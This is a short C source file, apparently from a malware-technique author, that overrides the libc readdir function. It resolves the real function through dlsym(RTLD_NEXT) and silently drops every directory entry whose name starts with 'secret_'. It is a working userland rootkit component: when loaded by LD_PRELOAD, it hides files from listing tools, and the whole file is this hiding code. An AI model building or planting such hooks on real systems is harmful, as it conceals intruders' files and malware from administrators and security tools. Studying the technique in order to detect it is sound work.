/*
 * hide.c
 * hides directory entries whose name starts with "secret_"
 * author: @cocomelonc
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>

#define HIDE_PREFIX "secret_"

static struct dirent *(*next_readdir)(DIR *);

__attribute__((constructor))
static void hide_init(void) {
  dlerror();
  next_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
  if (dlerror() != NULL) {
    next_readdir = NULL;
  }
}

struct dirent *readdir(DIR *dir) {
  if (next_readdir == NULL) {
    errno = ENOSYS;
    return NULL;
  }

  for (;;) {
    struct dirent *entry = next_readdir(dir);
    if (entry == NULL) {
      return NULL;
    }

    if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
      continue; // skip this entry, fetch the next one
    }

    return entry;
  }
}